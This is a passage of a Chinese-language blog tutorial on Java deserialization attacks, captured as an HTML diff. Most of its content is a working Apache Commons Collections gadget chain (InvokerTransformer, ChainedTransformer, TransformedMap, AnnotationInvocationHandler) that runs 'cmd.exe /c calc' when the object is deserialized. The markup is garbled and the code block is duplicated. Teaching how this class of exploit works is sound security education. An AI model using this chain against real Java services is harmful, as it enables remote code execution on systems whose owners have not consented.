class_">Transformer</span>[]&#123;<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>       <span class="hljs-comment">//Class.getMethod(String, Class[])</span><br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>       <span class="hljs-comment">//invoke(Object obj, Object... args)</span><br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;cmd.exe /c calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashmap,<span class="hljs-literal">null</span>,chainedTransformer);<br>Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br><span class="hljs-comment">//由于使用默认修饰符，需要获取访问权限</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Resource.class,transformedMap);<br><span class="hljs-comment">//测试</span><br>ByteArrayOutputStream exp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>oos.writeObject(handler);<br>oos.flush();<br>oos.close();<br>ByteArrayInputStream out=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_"><code class="language-hljs java">Map&lt;Object,Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object,Object&gt;();<br><span class="hljs-comment">//注解类中必须有的属性</span><br>hashmap.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-number">2</span>);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>       <span class="hljs-comment">//Class.getMethod(String, Class[])</span><br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>       <span class="hljs-comment">//invoke(Object obj, Object... args)</span><br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;cmd.exe /c calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashmap,<span class="hljs-literal">null</span>,chainedTransformer);<br>Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br><span class="hljs-comment">//由于使用默认修饰符，需要获取访问权限</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Resource.class,transformedMap);<br><span class="hljs-comment">//测试</span><br>ByteArrayOutputStream exp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>oos.writeObject(handler);<br>oos.flush();<br>oos.close();<br>ByteArrayInputStream out=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>Object obj=(Object) ois.readObject();<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2023/05/30/202305301540088.png" alt="image-20230530154001010" class="lazyload"></p>
+<p>当然除了使用<code>TransformedMap</code>还可以使用<code>LazyMap</code>做为触发条件，其中涉及到的操作会比<code>TransformedMap</code>稍微复杂一点。这部分内容有时间再补充</p>
+<p>That’s all</p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>S0cke3t<br>
+        <strong>本文链接：</strong><a href="https://www.saferoad.cc/Deserialization/Java-Deserialization-Chapter-%E2%85%A2.html" title="https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Deserialization&#x2F;Java-Deserialization-Chapter-%E2%85%A2.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Deserialization&#x2F;Java-Deserialization-Chapter-%E2%85%A2.html</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Deserialization/">Deserialization</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Java/" rel="tag">Java</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CommonsCollections"><span class="toc-number">2.</span> <span class="toc-text">CommonsCollections</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformer"><span class="toc-number">3.</span> <span class="toc-text">Transformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokeTransformer"><span class="toc-number">4.</span> <span class="toc-text">InvokeTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">5.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformedMap"><span class="toc-number">6.</span> <span class="toc-text">TransformedMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">7.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1691209190560"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
